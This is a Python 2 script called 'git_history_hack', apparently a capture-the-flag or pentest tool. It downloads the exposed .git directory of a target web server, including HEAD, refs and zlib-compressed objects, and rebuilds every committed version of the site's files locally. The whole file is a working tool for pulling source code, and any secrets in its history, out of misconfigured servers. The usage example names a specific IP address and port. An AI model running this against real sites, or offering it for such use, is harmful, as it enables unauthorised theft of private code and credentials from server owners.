######################################################
#             coding by wupco --whu dawn             #
#                    git_history_hack                #
# ex: githack.py http://218.76.35.75:20104/ gitfiles #
######################################################
#coding:utf-8
import urllib2
import os
import re
import urlparse
import zlib
import binascii
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

root = 1
def lastHash(url):
	ref = urllib2.urlopen(str(url)+"/.git/HEAD")
	if ref:
		refstr = str(ref.read().strip().split(": ")[1])
		lasthash = str(urllib2.urlopen(str(url)+"/.git/"+refstr).read()).strip()
		return lasthash
	else:
		return False

def getfile(hashstr,url,truedir,outputrootdir):
	global root
	dic = str(hashstr[0:2])
	fname = str(hashstr[2:])
	filedata = urllib2.urlopen(str(url)+"/.git/objects/"+dic+"/"+fname).read()
	filedata = zlib.decompress(filedata)
	if str(filedata[0:6])=='commit':
		commit_tree = filedata.split("\n")[0].split('tree ')[1].strip()
		print 'output history'+str(root)
		parent = filedata.split("\n")[1].split('parent ')[1].strip() if str(filedata.split("\n")[1][0:6])=='parent' else 'Null'
		getfile(commit_tree,url,truedir,outputrootdir)
		with open(outputrootdir+'/'+str(root)+'/commit_information'+str(hashstr)+'.txt', 'w') as f:
			f.write(filedata.decode("ascii"))
		root = root + 1
		if parent!='Null':
			getfile(parent,url,truedir,outputrootdir)
			
	elif str(filedata[0:4])=='tree':
		if filedata.find("40000 ")!=-1:
			dirfile = filedata.split("40000 ")
			if len(dirfile)<=2:
				dirfilesplit = dirfile[1].split(chr(0),1)
				dirname = dirfilesplit[0]
				dirhex = binascii.b2a_hex(str(dirfilesplit[1])[0:20])
				truedir = str(root)+'/'+dirname			
				getfile(dirhex,url,truedir,outputrootdir)
				truedir = chr(0)
			else:
				for j in range(1,len(dirfile)-1,1):
					dirfilesplit = dirfile[j].split(chr(0),1)
					dirname = dirfilesplit[0]
					dirhex = binascii.b2a_hex(str(dirfilesplit[1])[0:20])
					truedir = str(root)+'/'+dirname
					getfile(dirhex,url,truedir,outputrootdir)
				truedir = chr(0)

		if filedata.find("100644 ")!=-1:
			splitstr = filedata.split("100644 ")
			for i in range(1,len(splitstr),1):
				filesplit = splitstr[i].split(chr(0),1)
				filename = filesplit[0]
				savedir = hashstr
				filehex = binascii.b2a_hex(str(filesplit[1])[0:20])
				filecontent = re.sub('blob \d+\00', '', getfile(filehex,url,truedir,outputrootdir))
				outputfile(filename,filecontent,truedir,outputrootdir)

	else:
		return filedata

		
def outputfile(filename,filecontent,truedir,outputrootdir):
	global root
	if not os.path.exists(outputrootdir+'/'+str(root)):	
		os.mkdir(outputrootdir+'/'+str(root))
	if truedir!=chr(0):
		if not os.path.exists(outputrootdir+'/'+truedir):
			os.mkdir(outputrootdir+'/'+truedir)
		with open(outputrootdir+'/'+truedir+'/'+filename, 'wb') as f:
			f.write(filecontent)
	else:
		with open(outputrootdir+'/'+str(root)+'/'+filename, 'wb') as f:
			f.write(filecontent)
	return

if __name__ == '__main__':
	url = str(sys.argv[1])
	opfilename = str(sys.argv[2])
	lasthash = lastHash(url)
	if not os.path.exists(opfilename):	
		os.mkdir(opfilename)
	getfile(lasthash,url,chr(0),opfilename)
